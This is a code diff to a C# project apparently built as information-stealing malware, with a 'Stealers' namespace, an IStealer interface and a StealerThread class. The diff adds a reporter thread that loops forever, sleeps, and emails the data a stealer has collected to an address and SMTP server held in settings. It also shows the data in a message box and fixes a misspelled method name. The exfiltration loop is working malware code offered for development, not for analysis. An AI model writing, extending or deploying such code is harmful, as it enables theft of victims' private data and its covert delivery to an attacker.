@@ -1,4 +1,6 @@
 ﻿using System.Threading;
+using System.Windows.Forms;
+using sub.Stealers;
 
 namespace sub
 {
@@ -10,7 +12,17 @@ namespace sub
         public StealerThread(IStealer stealer)
         {
             _stealer = new Thread(stealer.Collect);
-            _reporter = new Thread(stealer.ReportData);
+            _reporter = new Thread(delegate(object delay)
+                                       {
+                                           while (true)
+                                           {
+                                               Thread.Sleep((int) delay);
+                                               MessageBox.Show(stealer.Data);
+                                               new ReportEmail(stealer.GetType().Name, Settings.EmailAddress,
+                                                               Settings.EmailPassword,
+                                                               Settings.SmtpAddress, Settings.SmtpPort).Send(stealer.Data);
+                                           }
+                                       });
         }
 
         public void Start(int param)
@@ -24,7 +36,7 @@ namespace sub
             return _stealer;
         }
 
-        public Thread GetReporterhread()
+        public Thread GetReporterThread()
         {
             return _reporter;
         }
